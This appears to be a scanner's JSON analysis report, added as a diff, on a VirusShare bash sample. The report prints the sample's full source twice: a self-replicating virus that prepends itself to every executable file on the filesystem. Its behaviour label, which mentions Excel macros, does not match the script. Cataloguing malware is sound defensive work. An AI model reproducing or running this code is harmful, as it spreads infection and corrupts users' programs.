@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "exec": "May run an executable file or a system command using Excel 4 Macros"
+        },
+        "macro": "#!/bin/bash\nif [ \"$1\" != infect ]\nthen\n    if [ ! -f /tmp/vir-* ]\n    then\n        $0 infect &\n    fi\n    tail +25 $0 >>/tmp/vir-$$\n    chmod 777 /tmp/vir-$$\n    /tmp/vir-$$ $@\n    CODE=$?\nelse\n    find / -type f -perm +100 -exec bash -c \\\n    \"if [ -z \\\"\\`cat {}|grep VIRUS\\`\\\" ]; \\\n    then \\\n        cp {} /tmp/vir-$$; \\\n        (head -24 $0 >{}) 2>/dev/null; \\\n        (cat /tmp/vir-$$ >>{}) 2>/dev/null; \\\n        rm /tmp/vir-$$; \\\n    fi\" \\;\n    CODE=0\nfi\nrm -f /tmp/vir-$$\nexit $CODE"
+    },
+    "filename": "VirusShare_1412382920bd2a7fdeec22f6f6f7b758",
+    "filesize": 491,
+    "filetype": "Bourne-Again shell script, ASCII text executable",
+    "hashes": {
+        "md5": "1412382920bd2a7fdeec22f6f6f7b758",
+        "sha1": "68ee7e4b2fee3d36eef150c09e70c07d0444e732",
+        "sha256": "bd530d3bcf208a8c570aab929a4614bd527fe46ce63b53eac6afafcbabb9d347"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/bash",
+            "if [ \"$1\" != infect ]",
+            "then",
+            "    if [ ! -f /tmp/vir-* ]",
+            "    then",
+            "        $0 infect &",
+            "    fi",
+            "    tail +25 $0 >>/tmp/vir-$$",
+            "    chmod 777 /tmp/vir-$$",
+            "    /tmp/vir-$$ $@",
+            "    CODE=$?",
+            "else",
+            "    find / -type f -perm +100 -exec bash -c \\",
+            "    \"if [ -z \\\"\\`cat {}|grep VIRUS\\`\\\" ]; \\",
+            "    then \\",
+            "        cp {} /tmp/vir-$$; \\",
+            "        (head -24 $0 >{}) 2>/dev/null; \\",
+            "        (cat /tmp/vir-$$ >>{}) 2>/dev/null; \\",
+            "        rm /tmp/vir-$$; \\",
+            "    fi\" \\;",
+            "    CODE=0",
+            "rm -f /tmp/vir-$$",
+            "exit $CODE"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266849",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
